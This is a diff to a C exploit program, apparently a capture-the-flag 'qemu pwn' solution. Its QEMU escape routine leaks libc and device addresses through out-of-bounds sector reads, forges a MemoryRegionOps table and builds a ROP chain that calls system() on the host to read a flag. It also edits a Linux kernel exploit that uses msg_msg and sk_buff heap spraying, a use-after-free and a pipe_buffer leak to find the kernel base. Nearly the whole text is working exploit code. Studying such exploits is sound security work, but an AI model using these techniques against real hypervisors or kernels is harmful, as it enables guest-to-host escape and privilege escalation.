@@ -48,7 +48,9 @@
 #define LIBC_MOV_RSP_RDX_RET 0x5a170
 #define LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0
 #define LIBC_POP_RDI_RET 0x2a3e5
+#define LIBC_RET 0x2a3e6
 #define LIBC_BIN_SH 0x1d8698
+#define LIBC_PUTS 0x80ed0
 
 enum BYTEDEV_MODE {
     BYTEDEV_MODE_STREAM = 0,
@@ -200,9 +202,9 @@ void trigerOutOfBoundWrite(int dev_fd, int socket_fd[2])
     trash_data = malloc(BYTEDEV_BUF_SIZE);
     memset(trash_data, 0x84, BYTEDEV_BUF_SIZE);
 
-    printf("[*] write %d bytes to dev \n", 
+    printf("[*] write %ld bytes to dev \n", 
             write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
-    printf("[*] read %d bytes from dev\n", 
+    printf("[*] read %ld bytes from dev\n", 
             read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));
 
     /* construct fake bytedev_data */
@@ -225,6 +227,7 @@ void qemuEscape(void)
 {
     int dev_fd, ret;
     uint64_t buf[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
+    uint64_t fake_ops[BYTEDEV_SECTOR_SIZE / sizeof(uint64_t)];
     uint64_t libc_base, opaque, byte_dev_pmio_read;
 
     if ((dev_fd = open("/dev/bytedev", O_RDWR)) < 0) {
@@ -235,6 +238,7 @@ void qemuEscape(void)
 
     /**
      * SECTOR -23: container
+     * XXX: in docker-built Ubuntu 22.04, we cannot leak libc there.
      *      [55] g_str_hash
      *      [56] g_str_equal
      * SECTOR -24: BYTEPCIDevState
@@ -250,6 +254,8 @@ void qemuEscape(void)
      *      SECTOR -347 MemoryRegion - pmio
      *          [4] opaque
      *          [9] ops
+     * SECTOR -388
+     *      [8] <g_str_hash>
      */
 
     /**
@@ -259,37 +265,36 @@ void qemuEscape(void)
     puts("");
     puts("\033[34m\033[1m[*] Step.I leak basic\033[0m");
 
-    puts("\033[34m\033[1m[*] Reading from -23 sector...\033[0m");
+    puts("\033[34m\033[1m[*] Reading from -388 sector...\033[0m");
 
-    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -23);
+    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -388);
     read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
 
-    if (buf[55] < 0x7f0000000000) {
+    if (buf[7] < 0x7f0000000000) {
         for (int i = 0; i < BYTEDEV_SECTOR_SIZE / sizeof(uint64_t); i++) {
-            printf("[--data-dump--][%d] %llx\n", i, buf[i]);
+            printf("[--data-dump--][%d] %lx\n", i, buf[i]);
         }
         errExit("failed to leak libc related ptr!");
     }
 
     /* This's the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */
-    libc_base = buf[55] - 0x3ea410;
+    libc_base = buf[7] - 0x3ea410;
 
-    printf("\033[32m\033[1m[+] Got g_str_hash ptr: \033[0m%llx\n", buf[54]);
-    printf("\033[32m\033[1m[+] Got libc_base: \033[0m%llx\n", libc_base);
+    printf("\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n", libc_base);
 
     puts("\033[34m\033[1m[*] Reading from -25 sector...\033[0m");
 
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -25);
-    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
-    byte_dev_pmio_read = buf[0];
-    printf("\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%llx\n", 
+    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);
+    byte_dev_pmio_read = fake_ops[0];
+    printf("\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n", 
             byte_dev_pmio_read);
     
     puts("\033[34m\033[1m[*] Reading from -347 sector...\033[0m");
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
     read(dev_fd, buf, 10 * sizeof(uint64_t));
     opaque = buf[4];
-    printf("\033[32m\033[1m[+] Got opaque: \033[0m%llx\n", opaque);
+    printf("\033[32m\033[1m[+] Got opaque: \033[0m%lx\n", opaque);
 
     /**
      * Step.II construct fake pmio->ops
@@ -297,44 +302,54 @@ void qemuEscape(void)
      * so that nothing will be effects
      */
 
-    /**
-     * TODO: a more valid MemoryRegionOps is needed
-     * we need to make a better one
-     * try with empty bar space?
-     */
-
     puts("");
     puts("\033[34m\033[1m[*] Step.II construct fake pmio->ops\033[0m");
     
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -24);
-    read(dev_fd, buf, 35 * sizeof(uint64_t));
+    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
 
-    buf[26]  = buf[27] = 0;
-    strcpy(&buf[26], "cat ./flag");
-    buf[28] = byte_dev_pmio_read;
+    /**
+     * XXX: I used to put it on the buf[26] && buf[27],
+     * but it'll be overwrite unexpectedly, so I put it further...
+     * 
+     * Another problem is that when I test /bin/sh in docker locally,
+     * the shell it provided is not an interactive one
+     * (I can't type anything and nothing works after my typing).
+     * The message it shows is :
+     *      # sh: turning off NDELAY mode
+     * But for some other qemu pwns, it comes the same message 
+     * with correct works. So I think the problem is not here, but where?
+     */
+    buf[33] = buf[34] = 0;
+    strcpy((char*)&buf[33], "cat ./flag");
+
+    /* the new rdx starts there */
+    buf[28] = libc_base + LIBC_POP_RDI_RET;
+    buf[29] = opaque + 33 * 8;//libc_base + LIBC_BIN_SH;
+    buf[30] = libc_base + LIBC_SYSTEM;
+    //buf[31] = 
+    /**
+     * [rdx + 20]
+     * mov rsp, rdx ; ret
+     */
+    buf[32] = libc_base + LIBC_MOV_RSP_RDX_RET;
+
+    /* the [rdi + 8] */
+    buf[1] = opaque + 28 * 8;
+
+    /* fake ops on bar space */
+    for (int i = 0; i < 10; i++) {
+        buf[50 + i] = fake_ops[i];
+    }
     /**
      * mov rdx, qword ptr [rdi + 8] ; -> store the ptr in opaque[1]
      * mov qword ptr [rsp], rax ; 
      * call qword ptr [rdx + 0x20]  -> another call
      */
-    buf[29] = 
+    buf[51] = 
         libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;
 
-    /* the new rdx starts there */
-    buf[30] = libc_base + LIBC_POP_RDI_RET;
-    buf[31] = libc_base + LIBC_BIN_SH;
-    buf[32] = libc_base + LIBC_SYSTEM;
-    //buf[33] = 
-    /**
-     * [rdx + 20]
-     * mov rsp, rdx ; ret
-     */
-    buf[34] = libc_base + LIBC_MOV_RSP_RDX_RET;
-
-    /* the [rdi + 8] */
-    buf[1] = opaque + 30 * 8;
-
-    write(dev_fd, buf, 35 * sizeof(uint64_t));
+    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);
 
     /**
      * Step.III change pmio->ops to fake ops on opaque
@@ -346,7 +361,7 @@ void qemuEscape(void)
     ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, -347);
     read(dev_fd, buf, 10 * sizeof(uint64_t));
 
-    buf[9] = opaque + 28 * 8;
+    buf[9] = opaque + 50 * 8;
     write(dev_fd, buf, 10 * sizeof(uint64_t));
 
     /**
@@ -575,7 +590,7 @@ int main(int argc, char **argv, char **envp)
             &oob_msg.mtext[(SECONDARY_MSG_SIZE) - sizeof(struct msg_msg)];
     
     printf("\033[32m\033[1m[+] addr of primary msg of msg nearby victim: ");
-    printf("\033[0m%llx\n", nearby_msg->m_list.prev);
+    printf("\033[0m%lx\n", nearby_msg->m_list.prev);
 
     /**
      * release and re-spray sk_buff to construct fake msg_msg
@@ -607,9 +622,9 @@ int main(int argc, char **argv, char **envp)
             &oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];
     victim_addr = nearby_msg_prim->m_list.next - 0x400;
     
-    printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%llx\n", 
+    printf("\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n", 
             nearby_msg_prim->m_list.next);
-    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%llx\n", 
+    printf("\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n", 
             victim_addr);
 
     /**
@@ -680,7 +695,7 @@ int main(int argc, char **argv, char **envp)
             }
             
             if (pipe_buf_ptr->ops > 0xffffffff81000000) {
-                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%llx\n", 
+                printf("\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n", 
                         pipe_buf_ptr->ops);
                 kernel_offset = pipe_buf_ptr->ops - ANON_PIPE_BUF_OPS;
                 kernel_base = 0xffffffff81000000 + kernel_offset;
@@ -688,8 +703,8 @@ int main(int argc, char **argv, char **envp)
         }
     }
 
-    printf("\033[32m\033[1m[+] kernel base: \033[0m%llx  ", kernel_base);
-    printf("\033[32m\033[1moffset: \033[0m%llx\n", kernel_offset);
+    printf("\033[32m\033[1m[+] kernel base: \033[0m%lx  ", kernel_base);
+    printf("\033[32m\033[1moffset: \033[0m%lx\n", kernel_offset);
     
     /**
      * Step.V
